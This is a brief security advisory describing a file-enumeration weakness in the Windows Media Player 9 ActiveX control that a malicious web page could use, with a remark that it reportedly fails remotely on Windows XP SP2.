The Windows Media Player ActiveX control is prone to a security weakness that may allow a malicious Web page to enumerate files that exist on the client computer.

This could aid in further attacks.

This issue is reported to affect Windows Media Player 9. It reportedly does not work on computers running Windows XP SP2 when the attack is executed from a remote source. This is likely due to additional browser security measures in Windows XP SP2.
